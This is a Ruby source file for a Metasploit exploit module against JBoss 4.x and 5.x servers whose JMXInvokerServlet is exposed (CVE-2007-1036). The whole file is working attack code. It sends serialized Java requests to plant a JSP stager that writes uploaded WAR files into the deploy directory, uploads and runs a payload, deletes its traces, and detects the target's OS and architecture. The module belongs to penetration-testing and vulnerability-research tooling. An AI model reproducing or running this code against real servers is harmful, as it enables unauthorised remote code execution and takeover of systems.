require 'msf/core'


class Metasploit4 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /JBoss/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)',
			'Description' => %q{
					This module can be used to execute a payload on JBoss servers that have an
				exposed HTTPAdaptor's JMX Invoker exposed on the "JMXInvokerServlet". By invoking
				the methods provided by jboss.admin:DeploymentFileRepository a stager is deployed
				to finally upload the selected payload to the target. The DeploymentFileRepository
				methods are only available on Jboss 4.x and 5.x.
			},
			'Author'      => [
				'Patrick Hof', # Vulnerability discovery, analysis and PoC
				'Jens Liebchen', # Vulnerability discovery, analysis and PoC
				'h0ng10' # Metasploit module
			],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2007-1036' ],
					[ 'OSVDB', '33744' ],
					[ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
				],
			'DisclosureDate' => 'Feb 20 2007',
			'Privileged'  => true,
			'Platform'    => ['java', 'win', 'linux' ],
			'Stance'      => Msf::Exploit::Stance::Aggressive,
			'Targets'     =>
				[

					# do target detection but java meter by default
					[ 'Automatic',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						}
					],

					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
						},
					],

					#
					# Platform specific targets
					#
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],

					[ 'Linux x86',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						},
					],
				],

			'DefaultTarget'  => 0))

			register_options(
				[
					Opt::RPORT(8080),
					OptString.new('JSP',       [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
					OptString.new('APPBASE',   [ false, 'Application base name, (default: random)', nil ]),
					OptString.new('TARGETURI', [ true,  'The URI path of the invoker servlet', '/invoker/JMXInvokerServlet' ]),
				], self.class)

	end

	def check
		res = send_serialized_request('version.bin')
		if (res.nil?) or (res.code != 200)
			print_error("Unable to request version, returned http code is: #{res.code.to_s}")
			return Exploit::CheckCode::Unknown
		end

		# Check if the version is supported by this exploit
		return Exploit::CheckCode::Vulnerable if res.body =~ /CVSTag=Branch_4_/
		return Exploit::CheckCode::Vulnerable if res.body =~ /SVNTag=JBoss_4_/
		return Exploit::CheckCode::Vulnerable if res.body =~ /SVNTag=JBoss_5_/

		if res.body =~ /ServletException/	# Simple check, if we caused an exception.
			print_status("Target seems vulnerable, but the used JBoss version is not supported by this exploit")
			return Exploit::CheckCode::Appears
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		mytarget = target

		if (target.name =~ /Automatic/)
			mytarget = auto_target
			fail_with("Unable to automatically select a target") if not mytarget
			print_status("Automatically selected target: \"#{mytarget.name}\"")
		else
			print_status("Using manually select target: \"#{mytarget.name}\"")
		end


		# We use a already serialized stager to deploy the final payload
		regex_stager_app_base = rand_text_alpha(14)
		regex_stager_jsp_name = rand_text_alpha(14)
		name_parameter = rand_text_alpha(8)
		content_parameter = rand_text_alpha(8)
		stager_uri = "/#{regex_stager_app_base}/#{regex_stager_jsp_name}.jsp"
		stager_code = "A" * 810		# 810 is the size of the stager in the serialized request

		replace_values = {
			'regex_app_base' => regex_stager_app_base,
			'regex_jsp_name' => regex_stager_jsp_name,
			stager_code => generate_stager(name_parameter, content_parameter)
		}

		print_status("Deploying stager")
		send_serialized_request('installstager.bin', replace_values)
		print_status("Calling stager: #{stager_uri}")
		call_uri_mtimes(stager_uri, 5, 'GET')

		# Generate the WAR with the payload which will be uploaded through the stager
		app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))
		jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))

		war_data = payload.encoded_war({
			:app_name => app_base,
			:jsp_name => jsp_name,
			:arch => mytarget.arch,
			:platform => mytarget.platform
		}).to_s

		b64_war = Rex::Text.encode_base64(war_data)
		print_status("Uploading payload through stager")
		res = send_request_cgi({
			'uri'     => stager_uri,
			'method'  => "POST",
			'vars_post' =>
			{
				name_parameter => app_base,
				content_parameter => b64_war
			}
		}, 20)

		payload_uri = "/#{app_base}/#{jsp_name}.jsp"
		print_status("Calling payload: " + payload_uri)
		res = call_uri_mtimes(payload_uri,5, 'GET')

		# Remove the payload through  stager
		print_status("Removing payload through stager")
		delete_payload_uri = stager_uri + "?#{name_parameter}=#{app_base}"
		res = send_request_cgi(
			{'uri'     => delete_payload_uri,
		})

		# Remove the stager
		print_status("Removing stager")
		send_serialized_request('removestagerfile.bin', replace_values)
		send_serialized_request('removestagerdirectory.bin', replace_values)

		handler
	end

	def generate_stager(name_param, content_param)
		war_file = rand_text_alpha(4+rand(4))
		file_content = rand_text_alpha(4+rand(4))
		jboss_home = rand_text_alpha(4+rand(4))
		decoded_content = rand_text_alpha(4+rand(4))
		path = rand_text_alpha(4+rand(4))
		fos = rand_text_alpha(4+rand(4))
		name = rand_text_alpha(4+rand(4))
		file = rand_text_alpha(4+rand(4))

		stager_script = <<-EOT
<%@page import="java.io.*,
		java.util.*,
		sun.misc.BASE64Decoder"
%>
<%
String #{file_content} = "";
String #{war_file} = "";
String #{jboss_home} = System.getProperty("jboss.server.home.dir");
if (request.getParameter("#{content_param}") != null){
try {
#{file_content} = request.getParameter("#{content_param}");
#{war_file} = request.getParameter("#{name_param}");
byte[] #{decoded_content} = new BASE64Decoder().decodeBuffer(#{file_content});
String #{path} = #{jboss_home} + "/deploy/" + #{war_file} + ".war";
FileOutputStream #{fos} = new FileOutputStream(#{path});
#{fos}.write(#{decoded_content});
#{fos}.close();
}
catch(Exception e) {}
}
else {
try{
String #{name} = request.getParameter("#{name_param}");
String #{file} = #{jboss_home} + "/deploy/" + #{name} + ".war";
new File(#{file}).delete();
}
catch(Exception e) {}
}

%>
EOT

	# The script must be exactly 810 characters long, otherwise we might have serialization issues
	# Therefore we fill the rest wit spaces
	spaces  = " " * (810 - stager_script.length)
	stager_script << spaces
	end


	def send_serialized_request(file_name , replace_params = {})
		path = File.join( Msf::Config.install_root, "data", "exploits", "jboss_jmxinvoker", "DeploymentFileRepository", file_name)
		data = File.open( path, "rb" ) { |fd| data = fd.read(fd.stat.size) }

		replace_params.each { |key, value| data.gsub!(key, value) }

		res = send_request_cgi({
			'uri'     => target_uri.path,
			'method'  => 'POST',
			'data'    => data,
			'headers' =>
				{
					'ContentType:' => 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation',
					'Accept' =>  'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
				}
		}, 25)


		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting preserialized request #{file_name}")
			return nil
		end

		res
	end


	def call_uri_mtimes(uri, num_attempts = 5, verb = nil, data = nil)
		# JBoss might need some time for the deployment. Try 5 times at most and
		# wait 5 seconds inbetween tries
		num_attempts.times do |attempt|
			if (verb == "POST")
				res = send_request_cgi(
					{
						'uri'    => uri,
						'method' => verb,
						'data'   => data
					}, 5)
			else
				uri += "?#{data}" unless data.nil?
				res = send_request_cgi(
					{
						'uri'    => uri,
						'method' => verb
					}, 30)
			end

			msg = nil
			if (!res)
				msg = "Execution failed on #{uri} [No Response]"
			elsif (res.code < 200 or res.code >= 300)
				msg = "http request failed to #{uri} [#{res.code}]"
			elsif (res.code == 200)
				print_status("Successfully called '#{uri}'") if datastore['VERBOSE']
				return res
			end

			if (attempt < num_attempts - 1)
				msg << ", retrying in 5 seconds..."
				print_status(msg) if datastore['VERBOSE']
				select(nil, nil, nil, 5)
			else
				print_error(msg)
				return res
			end
		end
	end


	def auto_target
		print_status("Attempting to automatically select a target")

		plat = detect_platform()
		arch = detect_architecture()

		return nil if (not arch or not plat)

		# see if we have a match
		targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }

		# no matching target found
		return nil
	end


	# Try to autodetect the target platform
	def detect_platform
		print_status("Attempting to automatically detect the platform")
		res = send_serialized_request("osname.bin")

		if (res.body =~ /(Linux|FreeBSD|Windows)/i)
			os = $1
			if (os =~ /Linux/i)
				return 'linux'
			elsif (os =~ /FreeBSD/i)
				return 'linux'
			elsif (os =~ /Windows/i)
				return 'win'
			end
		end
		nil
	end


	# Try to autodetect the architecture
	def detect_architecture()
		print_status("Attempting to automatically detect the architecture")
		res = send_serialized_request("osarch.bin")
		if (res.body =~ /(i386|x86)/i)
			arch = $1
			if (arch =~ /i386|x86/i)
				return ARCH_X86
				# TODO, more
			end
		end
		nil
	end
end
